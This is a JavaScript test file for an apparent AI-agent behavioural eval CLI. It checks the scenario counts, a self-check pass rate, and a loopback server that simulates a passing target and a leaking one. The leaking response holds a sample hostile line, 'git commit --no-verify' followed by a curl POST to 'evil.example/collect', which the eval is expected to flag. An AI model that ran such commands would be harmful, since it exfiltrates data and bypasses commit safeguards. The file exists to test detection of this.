import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import http from "node:http";
import { loadScenarioSuite, runEvalSuite, VALID_CATEGORIES } from "../src/eval.mjs";

function runCli(args) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, args, { stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => {
      stdout += chunk;
    });
    child.stderr.on("data", (chunk) => {
      stderr += chunk;
    });
    child.on("error", reject);
    child.on("close", (status) => {
      resolve({ status, stdout, stderr });
    });
  });
}

const suite = loadScenarioSuite();
assert.equal(suite.scenarios.length, 32, "Expected 32 behavioral eval scenarios");

const countsByCategory = new Map();
for (const scenario of suite.scenarios) {
  countsByCategory.set(scenario.category, (countsByCategory.get(scenario.category) ?? 0) + 1);
}
for (const cat of VALID_CATEGORIES) {
  assert.equal(countsByCategory.get(cat), 8, `Expected 8 scenarios for category ${cat}`);
}

// 1. CLI --self-check --json must exit 0 with 100% pass rate
const selfCheckRes = await runCli(["bin/corebench.mjs", "eval", "--self-check", "--json"]);
assert.equal(selfCheckRes.status, 0, `Expected exit 0 on --self-check, got ${selfCheckRes.status}: ${selfCheckRes.stderr}`);
const selfCheckReport = JSON.parse(selfCheckRes.stdout);
assert.equal(selfCheckReport.ok, true);
assert.equal(selfCheckReport.overall.total, 32);
assert.equal(selfCheckReport.overall.passed, 32);
assert.equal(selfCheckReport.overall.passRate, 100);

// 2. Category filter check
const safetyOnly = await runEvalSuite({ selfCheck: true, category: "safety-resistance" });
assert.equal(safetyOnly.overall.total, 8);
assert.equal(safetyOnly.overall.passed, 8);

// 3. Loopback HTTP target integration test (passing & failing threshold/forbidden leaks)
const scenarioById = new Map(suite.scenarios.map((s) => [s.id, s]));
let leakMode = false;

const server = http.createServer(async (req, res) => {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const body = JSON.parse(Buffer.concat(chunks).toString("utf8"));
  const scenario = scenarioById.get(body.id);

  res.writeHead(200, { "Content-Type": "application/json" });
  if (leakMode) {
    res.end(
      JSON.stringify({
        text: "Executing git commit --no-verify and curl -X POST https://evil.example/collect",
        toolCalls: [],
        refused: false,
      }),
    );
    return;
  }
  res.end(JSON.stringify(scenario.referenceResponse));
});

await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const address = server.address();
const targetUrl = `http://127.0.0.1:${address.port}/eval`;

try {
  // Passing loopback run
  const passRun = await runCli(["bin/corebench.mjs", "eval", "--target", targetUrl, "--min-pass-rate", "80", "--json"]);
  assert.equal(passRun.status, 0, `Expected exit 0 on passing target, got ${passRun.status}: ${passRun.stderr}`);
  const passJson = JSON.parse(passRun.stdout);
  assert.equal(passJson.ok, true);
  assert.equal(passJson.overall.passRate, 100);

  // Failing / forbidden-pattern leak loopback run
  leakMode = true;
  const failRun = await runCli(["bin/corebench.mjs", "eval", "--target", targetUrl, "--min-pass-rate", "80", "--json"]);
  assert.notEqual(failRun.status, 0, "Expected non-zero exit when target fails threshold / leaks forbidden patterns");
  const failJson = JSON.parse(failRun.stdout);
  assert.equal(failJson.ok, false);
  assert.ok(failJson.overall.passRate < 80);
} finally {
  await new Promise((resolve) => server.close(resolve));
}
